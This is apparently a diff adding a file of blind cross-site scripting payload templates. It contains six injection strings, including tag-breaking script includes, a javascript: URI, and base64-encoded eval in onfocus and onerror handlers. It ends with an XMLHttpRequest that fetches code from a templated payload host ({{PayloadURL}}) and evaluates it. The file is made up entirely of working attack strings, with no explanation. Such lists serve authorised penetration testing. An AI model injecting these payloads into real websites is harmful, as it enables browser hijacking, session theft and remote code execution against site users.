@@ -1,0 +1,12 @@
+"><script src={{PayloadURL}}></script>
+
+javascript:eval('var a=document.createElement(\'script\');a.src=\'{{PayloadURL}}\';document.body.appendChild(a)')
+
+"><input onfocus=eval(atob(this.id)) id={{BASE64PayloadURL}} autofocus>
+
+"><img src=x id={{BASE64PayloadURL}} onerror=eval(atob(this.id))>
+
+"><video><source onerror=eval(atob(this.id)) id={{BASE64PayloadURL}}>
+
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//{{PayloadURL}}");a.send();</script>
+
